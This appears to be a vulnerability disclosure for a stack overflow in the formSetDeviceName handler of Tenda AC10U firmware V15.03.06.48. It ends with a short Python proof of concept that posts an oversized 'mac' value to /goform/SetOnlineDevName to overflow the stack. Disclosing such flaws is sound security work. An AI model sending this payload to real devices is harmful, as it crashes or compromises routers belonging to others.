## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `formSetDeviceName` function. The `dev_id` variable receives the `mac` parameter from a POST request and is passed to function `set_device_name`. In this function, `mac_addr` is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `mac` can trigger this security vulnerability.

![image-20240313233114843](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313233114843.png)

![image-20240313233659719](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313233659719.png)

![image-20240313233713048](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313233713048.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*1000

data = {"mac": payload,"devName": 1}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313233758387.png)